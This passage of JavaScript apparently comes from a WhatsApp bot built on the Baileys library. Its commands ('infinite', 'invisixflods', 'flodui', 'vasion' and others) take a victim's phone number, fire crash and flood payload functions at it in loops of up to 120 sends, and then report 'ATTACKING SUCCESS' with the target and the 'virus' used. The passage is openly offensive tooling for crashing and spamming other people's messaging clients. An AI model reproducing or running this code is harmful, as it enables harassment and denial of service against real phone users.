										forwardingScore: 999,
										forwardedNewsletterMessageInfo: {
											newsletterJid: global.xchannel.jid,
											newsletterName: '🩸⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠️',
											serverMessageId: -1
										},
										businessMessageForwardInfo: {
											businessOwnerJid: VxoZap.decodeJid(VxoZap.user.id)
										},
									},
									body: proto.Message.InteractiveMessage.Body.create({
										text: ''
									}),
									footer: proto.Message.InteractiveMessage.Footer.create({
										text: "©𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉"
									}),
									header: proto.Message.InteractiveMessage.Header.create({
										title: `「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」\n\n𖥂 𝐓𝐀𝐑𝐆𝐄𝐓 : ${X.split("@")[0]}\n𖥂 𝐕𝐈𝐑𝐔𝐒 : 𝗝𝗜𝗗𝗦 𝗫 𝗦𝗤𝗟`,
										subtitle: "",
										hasMediaAttachment: true,
										...(await prepareWAMessageMedia({
											image: {
												url: thumbSky
											}
										}, {
											upload: VxoZap.waUploadToServer
										}))
									}),
									nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
										buttons: [{
											"name": "quick_reply",
											"buttonParamsJson": `{\"display_text\":\"🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉\",\"id\":\"\"}`
										}, ],
									})
								})
							}
						}
					}, {})

					await VxoZap.relayMessage(msg.key.remoteJid, msg.message, {
						messageId: msg.key.id
					});
					await taskdone(finishmoji)
				}
			}
			break
			case 'infinite': {
				if (!isBotRegistered) return zreply(`NOT ACCES‼️`);
				if (!isCreator) return zreply(mess.owner)
				if (!q) return zreply(`*Syntax Error!*\n\n_Use : Infinite Number_\n_Example : Infinite 62xx_\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`);
				let {
					proto,
					generateWAMessageFromContent
				} = require('@whiskeysockets/baileys')
				incTarget = text.split("|")[0].replace(/[^0-9]/g, '')
				if (incTarget.startsWith('0')) return zreply(`*Syntax Error!*\n\n_Use : Infinite Number_\n_Example : Infinite 62xx_\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`)
				let X = incTarget + '@s.whatsapp.net';
				if (owner.includes(incTarget)) {
					zreply('𝙁𝙖𝙞𝙡𝙚𝙙 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 𝙊𝙬𝙣𝙚𝙧!!')
				} else {
					zreply(`*𝙋𝙧𝙤𝙘𝙚𝙨𝙨 𝙄𝙣𝙛𝙞𝙣𝙞𝙩𝙮⚡*`)
					global.jumlah = text.split("|")[1]
					for (let i = 0; i < 20; i++) {
						await ZnXIvS(X, Ptcp = true)
					}
					let msg = generateWAMessageFromContent(m.chat, {
						viewOnceMessage: {
							message: {
								"messageContextInfo": {
									"deviceListMetadata": {},
									"deviceListMetadataVersion": 2
								},
								interactiveMessage: proto.Message.InteractiveMessage.create({
									contextInfo: {
										mentionedJid: [m.sender],
										isForwarded: true,
										forwardingScore: 999,
										forwardedNewsletterMessageInfo: {
											newsletterJid: global.xchannel.jid,
											newsletterName: '🩸⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠️',
											serverMessageId: -1
										},
										businessMessageForwardInfo: {
											businessOwnerJid: VxoZap.decodeJid(VxoZap.user.id)
										},
									},
									body: proto.Message.InteractiveMessage.Body.create({
										text: ''
									}),
									footer: proto.Message.InteractiveMessage.Footer.create({
										text: "©𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉"
									}),
									header: proto.Message.InteractiveMessage.Header.create({
										title: `「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」\n\n𖥂 𝐓𝐀𝐑𝐆𝐄𝐓 : ${X.split("@")[0]}\n𖥂 𝐕𝐈𝐑𝐔𝐒 : 𝗜𝗩𝗦 𝗜𝗡𝗙𝗜𝗡𝗜𝗧𝗘`,
										subtitle: "",
										hasMediaAttachment: true,
										...(await prepareWAMessageMedia({
											image: {
												url: thumbSky
											}
										}, {
											upload: VxoZap.waUploadToServer
										}))
									}),
									nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
										buttons: [{
											"name": "quick_reply",
											"buttonParamsJson": "{\"display_text\":\"🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉\",\"id\":\"\"}"
										}, ],
									})
								})
							}
						}
					}, {})

					await VxoZap.relayMessage(msg.key.remoteJid, msg.message, {
						messageId: msg.key.id
					});
					await taskdone(finishmoji)
				}
			}
			break
			case 'suxoinfinity': {
				if (!isBotRegistered) return zreply(`NOT ACCES‼️`);
				if (!isCreator) return zreply(mess.owner)
				if (!q) return zreply(`*Syntax Error!*\n\n_Use : Infinite Number_\n_Example : Infinite 62xx_\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`);
				let {
					proto,
					generateWAMessageFromContent
				} = require('@whiskeysockets/baileys')
				incTarget = text.split("|")[0].replace(/[^0-9]/g, '')
				if (incTarget.startsWith('0')) return zreply(`*Syntax Error!*\n\n_Use : Infinite Number_\n_Example : Infinite 62xx_\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`)
				let X = incTarget + '@s.whatsapp.net';
				if (owner.includes(incTarget)) {
					zreply('𝙁𝙖𝙞𝙡𝙚𝙙 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 𝙊𝙬𝙣𝙚𝙧!!')
				} else {
					zreply(`*𝙋𝙧𝙤𝙘𝙚𝙨𝙨 𝙄𝙣𝙛𝙞𝙣𝙞𝙩𝙮⚡*`)
					global.jumlah = text.split("|")[1]
					for (let i = 0; i < 5; i++) {
						await ZnX(X, "P", 1020000, Ptcp = true)
						await ClPmNull(X, null, GetsuZo, cct = true, ptcp = true)
						await ClPmNull(X, null, GetsuZo, cct = true, ptcp = true)
						await ZnX(X, nick.sss, 350000, Ptcp = true)
						await ZnX(X, nick.sss, 800000, Ptcp = true)
						await ZnX(X, nick.sss, 800000, Ptcp = true)
					}
					let msg = generateWAMessageFromContent(m.chat, {
						viewOnceMessage: {
							message: {
								"messageContextInfo": {
									"deviceListMetadata": {},
									"deviceListMetadataVersion": 2
								},
								interactiveMessage: proto.Message.InteractiveMessage.create({
									contextInfo: {
										mentionedJid: [m.sender],
										isForwarded: true,
										forwardingScore: 999,
										forwardedNewsletterMessageInfo: {
											newsletterJid: global.xchannel.jid,
											newsletterName: '🩸⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠️',
											serverMessageId: -1
										},
										businessMessageForwardInfo: {
											businessOwnerJid: VxoZap.decodeJid(VxoZap.user.id)
										},
									},
									body: proto.Message.InteractiveMessage.Body.create({
										text: ''
									}),
									footer: proto.Message.InteractiveMessage.Footer.create({
										text: "©𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉"
									}),
									header: proto.Message.InteractiveMessage.Header.create({
										title: `「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」\n\n𖥂 𝐓𝐀𝐑𝐆𝐄𝐓 : ${X.split("@")[0]}\n𖥂 𝐕𝐈𝐑𝐔𝐒 : 𝗦𝗤𝗟 𝘅 𝗖𝗥𝗟 𝗜𝗡𝗙𝗜𝗡𝗜𝗧𝗘`,
										subtitle: "",
										hasMediaAttachment: true,
										...(await prepareWAMessageMedia({
											image: {
												url: thumbSky
											}
										}, {
											upload: VxoZap.waUploadToServer
										}))
									}),
									nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
										buttons: [{
											"name": "quick_reply",
											"buttonParamsJson": "{\"display_text\":\"🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉\",\"id\":\"\"}"
										}, ],
									})
								})
							}
						}
					}, {})

					await VxoZap.relayMessage(msg.key.remoteJid, msg.message, {
						messageId: msg.key.id
					});
					await taskdone(finishmoji)
				}
			}
			break
			case 'invisixinfinite': {
				if (!isBotRegistered) return zreply(`NOT ACCES‼️`);
				if (!isCreator) return zreply(mess.owner)
				if (!q) return zreply(`*Syntax Error!*\n\n_Use : InVisiXInfinite Number_\n_Example : InVisiXInfinite 62xx_\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`);
				let {
					proto,
					generateWAMessageFromContent
				} = require('@whiskeysockets/baileys')
				incTarget = text.split("|")[0].replace(/[^0-9]/g, '')
				if (incTarget.startsWith('0')) return zreply(`*Syntax Error!*\n\n_Use : Infinite Number_\n_Example : Infinite 62xx_\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`)
				let X = incTarget + '@s.whatsapp.net';
				if (owner.includes(incTarget)) {
					zreply('𝙁𝙖𝙞𝙡𝙚𝙙 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 𝙊𝙬𝙣𝙚𝙧!!')
				} else {
					zreply(`*𝙋𝙧𝙤𝙘𝙚𝙨𝙨 𝙄𝙣𝙛𝙞𝙣𝙞𝙩𝙮⚡*`)
					global.jumlah = text.split("|")[1]
					for (let i = 0; i < 20; i++) {
						await InVisiXz(X, GetsuZo, cct = true, ptcp = true)
					}
					let msg = generateWAMessageFromContent(m.chat, {
						viewOnceMessage: {
							message: {
								"messageContextInfo": {
									"deviceListMetadata": {},
									"deviceListMetadataVersion": 2
								},
								interactiveMessage: proto.Message.InteractiveMessage.create({
									contextInfo: {
										mentionedJid: [m.sender],
										isForwarded: true,
										forwardingScore: 999,
										forwardedNewsletterMessageInfo: {
											newsletterJid: global.xchannel.jid,
											newsletterName: '🩸⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠️',
											serverMessageId: -1
										},
										businessMessageForwardInfo: {
											businessOwnerJid: VxoZap.decodeJid(VxoZap.user.id)
										},
									},
									body: proto.Message.InteractiveMessage.Body.create({
										text: ''
									}),
									footer: proto.Message.InteractiveMessage.Footer.create({
										text: "©𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉"
									}),
									header: proto.Message.InteractiveMessage.Header.create({
										title: `「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」\n\n𖥂 𝐓𝐀𝐑𝐆𝐄𝐓 : ${X.split("@")[0]}\n𖥂 𝐕𝐈𝐑𝐔𝐒 : 𝗜𝗡𝗩𝗜𝗦𝗜𝗫 𝗜𝗡𝗙𝗜𝗡𝗜𝗧𝗘`,
										subtitle: "",
										hasMediaAttachment: true,
										...(await prepareWAMessageMedia({
											image: {
												url: thumbSky
											}
										}, {
											upload: VxoZap.waUploadToServer
										}))
									}),
									nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
										buttons: [{
											"name": "quick_reply",
											"buttonParamsJson": "{\"display_text\":\"🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉\",\"id\":\"\"}"
										}, ],
									})
								})
							}
						}
					}, {})

					await VxoZap.relayMessage(msg.key.remoteJid, msg.message, {
						messageId: msg.key.id
					});
					await taskdone(finishmoji)
				}
			}
			break
			case 'invisixflods': {
				if (!isBotRegistered) return zreply(`NOT ACCES‼️`);
				if (!isCreator) return zreply(mess.owner)
				if (!q) return zreply(`*Syntax Error!*\n\n_Use : InVisiXflods Number_\n_Example : InVisiXflods 62xx_\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`);
				let {
					proto,
					generateWAMessageFromContent
				} = require('@whiskeysockets/baileys')
				incTarget = text.split("|")[0].replace(/[^0-9]/g, '')
				if (incTarget.startsWith('0')) return zreply(`*Syntax Error!*\n\n_Use : InVisiXflods Number_\n_Example : InVisiXflods 62xx_\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`)
				let X = incTarget + '@s.whatsapp.net';
				if (owner.includes(incTarget)) {
					zreply('𝙁𝙖𝙞𝙡𝙚𝙙 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 𝙊𝙬𝙣𝙚𝙧!!')
				} else {
					zreply(`*𝙋𝙧𝙤𝙘𝙚𝙨𝙨 𝙄𝙣𝙛𝙞𝙣𝙞𝙩𝙮⚡*`)
					global.jumlah = text.split("|")[1]
					for (let i = 0; i < 120; i++) {
						await InVisiXz(X, GetsuZo, cct = true, ptcp = true)
						await sleep(5000)
					}
					let msg = generateWAMessageFromContent(m.chat, {
						viewOnceMessage: {
							message: {
								"messageContextInfo": {
									"deviceListMetadata": {},
									"deviceListMetadataVersion": 2
								},
								interactiveMessage: proto.Message.InteractiveMessage.create({
									contextInfo: {
										mentionedJid: [m.sender],
										isForwarded: true,
										forwardingScore: 999,
										forwardedNewsletterMessageInfo: {
											newsletterJid: global.xchannel.jid,
											newsletterName: '🩸⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠️',
											serverMessageId: -1
										},
										businessMessageForwardInfo: {
											businessOwnerJid: VxoZap.decodeJid(VxoZap.user.id)
										},
									},
									body: proto.Message.InteractiveMessage.Body.create({
										text: ''
									}),
									footer: proto.Message.InteractiveMessage.Footer.create({
										text: "©𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉"
									}),
									header: proto.Message.InteractiveMessage.Header.create({
										title: `「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」\n\n𖥂 𝐓𝐀𝐑𝐆𝐄𝐓 : ${X.split("@")[0]}\n𖥂 𝐕𝐈𝐑𝐔𝐒 : 𝗜𝗡𝗩𝗜𝗦𝗜𝗫 𝗢𝗩𝗗`,
										subtitle: "",
										hasMediaAttachment: true,
										...(await prepareWAMessageMedia({
											image: {
												url: thumbSky
											}
										}, {
											upload: VxoZap.waUploadToServer
										}))
									}),
									nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
										buttons: [{
											"name": "quick_reply",
											"buttonParamsJson": "{\"display_text\":\"🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉\",\"id\":\"\"}"
										}, ],
									})
								})
							}
						}
					}, {})

					await VxoZap.relayMessage(msg.key.remoteJid, msg.message, {
						messageId: msg.key.id
					});
					await taskdone(finishmoji)
				}
			}
			break
			case 'flodui': {
				if (!isBotRegistered) return zreply(`NOT ACCES‼️`);
				if (!isCreator) return zreply(mess.owner)
				if (!q) return zreply(`*Syntax Error!*\n\n_Use : Flodui Number_\n_Example : Flodui 62xx_\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`);
				let {
					proto,
					generateWAMessageFromContent
				} = require('@whiskeysockets/baileys')
				incTarget = text.split("|")[0].replace(/[^0-9]/g, '')
				if (incTarget.startsWith('0')) return zreply(`*Syntax Error!*\n\n_Use : Flodui Number_\n_Example : Flodui 62xx_\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`)
				let X = incTarget + '@s.whatsapp.net';
				if (owner.includes(incTarget)) {
					zreply('𝙁𝙖𝙞𝙡𝙚𝙙 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 𝙊𝙬𝙣𝙚𝙧!!')
				} else {
					zreply(`*𝙋𝙧𝙤𝙘𝙚𝙨𝙨 𝙄𝙣𝙛𝙞𝙣𝙞𝙩𝙮⚡*`)
					global.jumlah = text.split("|")[1]
					for (let i = 0; i < 100; i++) {
						await CrashUi(X, GetsuZo, cct = true, ptcp = true)
					}
					let msg = generateWAMessageFromContent(m.chat, {
						viewOnceMessage: {
							message: {
								"messageContextInfo": {
									"deviceListMetadata": {},
									"deviceListMetadataVersion": 2
								},
								interactiveMessage: proto.Message.InteractiveMessage.create({
									contextInfo: {
										mentionedJid: [m.sender],
										isForwarded: true,
										forwardingScore: 999,
										forwardedNewsletterMessageInfo: {
											newsletterJid: global.xchannel.jid,
											newsletterName: '🩸⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠️',
											serverMessageId: -1
										},
										businessMessageForwardInfo: {
											businessOwnerJid: VxoZap.decodeJid(VxoZap.user.id)
										},
									},
									body: proto.Message.InteractiveMessage.Body.create({
										text: ''
									}),
									footer: proto.Message.InteractiveMessage.Footer.create({
										text: "©𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉"
									}),
									header: proto.Message.InteractiveMessage.Header.create({
										title: `「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」\n\n𖥂 𝐓𝐀𝐑𝐆𝐄𝐓 : ${X.split("@")[0]}\n𖥂 𝐕𝐈𝐑𝐔𝐒 : 𝗨𝗜 𝗜𝗡𝗙𝗜𝗡𝗜𝗧𝗘`,
										subtitle: "",
										hasMediaAttachment: true,
										...(await prepareWAMessageMedia({
											image: {
												url: thumbSky
											}
										}, {
											upload: VxoZap.waUploadToServer
										}))
									}),
									nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
										buttons: [{
											"name": "quick_reply",
											"buttonParamsJson": "{\"display_text\":\"🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉\",\"id\":\"\"}"
										}, ],
									})
								})
							}
						}
					}, {})

					await VxoZap.relayMessage(msg.key.remoteJid, msg.message, {
						messageId: msg.key.id
					});
					await taskdone(finishmoji)
				}
			}
			break
			case 'znxivs': {
				if (!isBotRegistered) return zreply(`NOT ACCES‼️`);
				if (!isCreator) return zreply(mess.owner)
				if (!q) return zreply(`*Syntax Error!*\n\n_Use : ZnxIvs Number_\n_Example : ZnxIvs 62xx_\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`);
				let {
					proto,
					generateWAMessageFromContent
				} = require('@whiskeysockets/baileys')
				incTarget = text.split("|")[0].replace(/[^0-9]/g, '')
				if (incTarget.startsWith('0')) return zreply(`*Syntax Error!*\n\n_Use : ZnxIvs Number_\n_Example : ZnxIvs 62xx_\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`)
				let X = incTarget + '@s.whatsapp.net';
				if (owner.includes(incTarget)) {
					zreply('𝙁𝙖𝙞𝙡𝙚𝙙 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 𝙊𝙬𝙣𝙚𝙧!!')
				} else {
					zreply(mess.bugrespon)
					global.jumlah = text.split("|")[1]
					for (let i = 0; i < 1; i++) {
						await ZnXIvS(X, Ptcp = true)
					}
					let msg = generateWAMessageFromContent(m.chat, {
						viewOnceMessage: {
							message: {
								"messageContextInfo": {
									"deviceListMetadata": {},
									"deviceListMetadataVersion": 2
								},
								interactiveMessage: proto.Message.InteractiveMessage.create({
									contextInfo: {
										mentionedJid: [m.sender],
										isForwarded: true,
										forwardingScore: 999,
										forwardedNewsletterMessageInfo: {
											newsletterJid: global.xchannel.jid,
											newsletterName: '🩸⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠️',
											serverMessageId: -1
										},
										businessMessageForwardInfo: {
											businessOwnerJid: VxoZap.decodeJid(VxoZap.user.id)
										},
									},
									body: proto.Message.InteractiveMessage.Body.create({
										text: ''
									}),
									footer: proto.Message.InteractiveMessage.Footer.create({
										text: "©𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉"
									}),
									header: proto.Message.InteractiveMessage.Header.create({
										title: `「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」\n\n𖥂 𝐓𝐀𝐑𝐆𝐄𝐓 : ${X.split("@")[0]}\n𖥂 𝐕𝐈𝐑𝐔𝐒 : 𝗖𝗥𝗟 𝗫 𝗦𝗤𝗟`,
										subtitle: "",
										hasMediaAttachment: true,
										...(await prepareWAMessageMedia({
											image: {
												url: thumbSky
											}
										}, {
											upload: VxoZap.waUploadToServer
										}))
									}),
									nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
										buttons: [{
											"name": "quick_reply",
											"buttonParamsJson": `{\"display_text\":\"🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉\",\"id\":\"Infinite ${incTarget}\"}`
										}, ],
									})
								})
							}
						}
					}, {})

					await VxoZap.relayMessage(msg.key.remoteJid, msg.message, {
						messageId: msg.key.id
					});
					await taskdone(finishmoji)
				}
			}
			break
			case 'invisix': {
				if (!isBotRegistered) return zreply(`NOT ACCES‼️`);
				if (!isCreator) return zreply(mess.owner)
				if (!q) return zreply(`*Syntax Error!*\n\n_Use : InVisiX Number_\n_Example : InVisiX 62xx_\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`);
				let {
					proto,
					generateWAMessageFromContent
				} = require('@whiskeysockets/baileys')
				incTarget = text.split("|")[0].replace(/[^0-9]/g, '')
				if (incTarget.startsWith('0')) return zreply(`*Syntax Error!*\n\n_Use : InVisiX Number_\n_Example : InVisiX 62xx_\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`)
				let X = incTarget + '@s.whatsapp.net';
				if (owner.includes(incTarget)) {
					zreply('𝙁𝙖𝙞𝙡𝙚𝙙 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 𝙊𝙬𝙣𝙚𝙧!!')
				} else {
					zreply(mess.bugrespon)
					global.jumlah = text.split("|")[1]
					for (let i = 0; i < 1; i++) {
						await ClPmNull(X, null, GetsuZo, cct = true, ptcp = true)
						await ClPm(X, GetsuZo, cct = true, ptcp = true)
						await InVisiXz(X, GetsuZo, cct = true, ptcp = true)
					}
					let msg = generateWAMessageFromContent(m.chat, {
						viewOnceMessage: {
							message: {
								"messageContextInfo": {
									"deviceListMetadata": {},
									"deviceListMetadataVersion": 2
								},
								interactiveMessage: proto.Message.InteractiveMessage.create({
									contextInfo: {
										mentionedJid: [m.sender],
										isForwarded: true,
										forwardingScore: 999,
										forwardedNewsletterMessageInfo: {
											newsletterJid: global.xchannel.jid,
											newsletterName: '🩸⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠️',
											serverMessageId: -1
										},
										businessMessageForwardInfo: {
											businessOwnerJid: VxoZap.decodeJid(VxoZap.user.id)
										},
									},
									body: proto.Message.InteractiveMessage.Body.create({
										text: ''
									}),
									footer: proto.Message.InteractiveMessage.Footer.create({
										text: "©𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉"
									}),
									header: proto.Message.InteractiveMessage.Header.create({
										title: `「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」\n\n⭑̤⟅̊༑ ▾ 𝐙͢𝐍ͮ𝐗 ⿻ 𝐈𝐍͢𝐕𝚫𝐒𝐈͢𝚯𝚴 ⿻ ▾ ༑̴⟆̊⭑̤`,
										subtitle: "",
										hasMediaAttachment: true,
										...(await prepareWAMessageMedia({
											image: {
												url: thumbSky
											}
										}, {
											upload: VxoZap.waUploadToServer
										}))
									}),
									nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
										buttons: [{
											"name": "quick_reply",
											"buttonParamsJson": `{\"display_text\":\"🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉\",\"id\":\"invisixinfinite ${incTarget}\"}`
										}, ],
									})
								})
							}
						}
					}, {})

					await VxoZap.relayMessage(msg.key.remoteJid, msg.message, {
						messageId: msg.key.id
					});
					await taskdone(finishmoji)
				}
			}
			break
			case 'vasion': {
				if (!isBotRegistered) return zreply(`NOT ACCES‼️`);
				if (!isCreator) return zreply(mess.owner)
				if (!q) return zreply(`*Syntax Error!*\n\n_Use : VaSion Number_\n_Example : VaSion 62xx_\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`);
				let {
					proto,
					generateWAMessageFromContent
				} = require('@whiskeysockets/baileys')
				incTarget = text.split("|")[0].replace(/[^0-9]/g, '')
				if (incTarget.startsWith('0')) return zreply(`*Syntax Error!*\n\n_Use : VaSion Number_\n_Example : VaSion 62xx_\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`)
				let X = incTarget + '@s.whatsapp.net';
				if (owner.includes(incTarget)) {
					zreply('𝙁𝙖𝙞𝙡𝙚𝙙 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 𝙊𝙬𝙣𝙚𝙧!!')
				} else {
					zreply(mess.bugrespon)
					global.jumlah = text.split("|")[1]
					for (let i = 0; i < 1; i++) {
						await StuckNull(X, GetsuZo, Ptcp = true)
						await ClPm(X, GetsuZo, cct = true, ptcp = true)
						await InVisiXz(X, GetsuZo, cct = true, ptcp = true)
					}
					let msg = generateWAMessageFromContent(m.chat, {
						viewOnceMessage: {
							message: {
								"messageContextInfo": {
									"deviceListMetadata": {},
									"deviceListMetadataVersion": 2
								},
								interactiveMessage: proto.Message.InteractiveMessage.create({
									contextInfo: {
										mentionedJid: [m.sender],
										isForwarded: true,
										forwardingScore: 999,
										forwardedNewsletterMessageInfo: {
											newsletterJid: global.xchannel.jid,
											newsletterName: '🩸⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠️',
											serverMessageId: -1
										},
										businessMessageForwardInfo: {
											businessOwnerJid: VxoZap.decodeJid(VxoZap.user.id)
										},
									},
									body: proto.Message.InteractiveMessage.Body.create({
										text: ''
									}),
									footer: proto.Message.InteractiveMessage.Footer.create({
										text: "©𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉"
									}),
									header: proto.Message.InteractiveMessage.Header.create({
										title: `「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」\n\n⭑̤⟅̊༑ ▾ 𝐙͢𝐍ͮ𝐗 ⿻ 𝐈𝐍͢𝐕𝚫𝐒𝐈͢𝚯𝚴 ⿻ ▾ ༑̴⟆̊⭑̤`,
										subtitle: "",
										hasMediaAttachment: true,
										...(await prepareWAMessageMedia({
											image: {
												url: thumbSky
											}
										}, {
											upload: VxoZap.waUploadToServer
										}))
									}),
									nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
										buttons: [{
											"name": "quick_reply",
